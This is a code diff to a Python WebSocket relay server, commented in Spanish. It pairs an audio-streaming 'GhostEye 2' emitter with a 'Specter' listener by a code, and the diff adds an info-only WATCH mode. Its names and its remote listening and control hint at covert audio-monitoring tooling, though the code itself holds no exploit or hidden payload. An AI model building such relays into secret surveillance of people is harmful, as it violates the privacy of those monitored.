@@ -5,8 +5,9 @@ import random
 import string
 import os
 
-clients = {}
-waiters = {}
+clients = {}   # code -> ghosteye ws
+waiters = {}   # code -> future para specter
+watchers = {}  # code -> set de ws en modo WATCH
 
 def gen_code():
     while True:
@@ -20,6 +21,8 @@ async def handle(request):
     try:
         msg = await asyncio.wait_for(ws.receive(), timeout=10)
         role = msg.data
+
+        # ── GHOSTEYE 2 emisor ──
         if role == "EMIT" or role.startswith("EMIT:"):
             if role.startswith("EMIT:"):
                 code = role[5:].strip()
@@ -32,6 +35,8 @@ async def handle(request):
                 waiters[code].cancel()
             clients[code] = ws
             waiters[code] = asyncio.get_event_loop().create_future()
+            if code not in watchers:
+                watchers[code] = set()
             await ws.send_str(f"CODE:{code}")
             try:
                 specter_ws = await asyncio.wait_for(waiters[code], timeout=300)
@@ -42,13 +47,24 @@ async def handle(request):
             await ws.send_str("READY")
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.BINARY:
+                    # Audio → Specter
                     try: await specter_ws.send_bytes(msg.data)
                     except Exception: break
                 elif msg.type == aiohttp.WSMsgType.TEXT:
+                    # INFO → Specter y Watchers
                     try: await specter_ws.send_str(msg.data)
                     except Exception: break
+                    # Reenviar INFO a todos los watchers
+                    if msg.data.startswith("INFO|"):
+                        dead = set()
+                        for watcher in watchers.get(code, set()):
+                            try: await watcher.send_str(msg.data)
+                            except Exception: dead.add(watcher)
+                        watchers.get(code, set()).difference_update(dead)
                 elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
+
+        # ── SPECTER oyente con audio ──
         elif role.startswith("JOIN:"):
             code = role[5:].strip()
             if code not in clients:
@@ -57,17 +73,37 @@ async def handle(request):
             await ws.send_str("OK")
             if code in waiters and not waiters[code].done():
                 waiters[code].set_result(ws)
-            # ✅ Reenviar mensajes de Specter → GhostEye 2
             ghosteye_ws = clients.get(code)
             async for msg in ws:
                 if msg.type == aiohttp.WSMsgType.TEXT:
-                    # Reenviar texto de Specter a GhostEye 2 (ej: STOP)
+                    # Reenviar mensajes de Specter → GhostEye 2 (ej: STOP)
                     ghosteye_ws = clients.get(code)
                     if ghosteye_ws:
                         try: await ghosteye_ws.send_str(msg.data)
                         except Exception: pass
                 elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                     break
+
+        # ── SPECTER solo info (WATCH) ──
+        elif role.startswith("WATCH:"):
+            code = role[6:].strip()
+            if code not in clients:
+                await ws.send_str("ERROR:INVALID_CODE")
+                return ws
+            await ws.send_str("WATCHING")
+            if code not in watchers:
+                watchers[code] = set()
+            watchers[code].add(ws)
+            # Pedir info actualizada a GhostEye 2
+            ghosteye_ws = clients.get(code)
+            if ghosteye_ws:
+                try: await ghosteye_ws.send_str("GET_INFO")
+                except Exception: pass
+            async for msg in ws:
+                if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
+                    break
+            watchers.get(code, set()).discard(ws)
+
     except Exception as e:
         print(f"Error: {e}")
     finally:
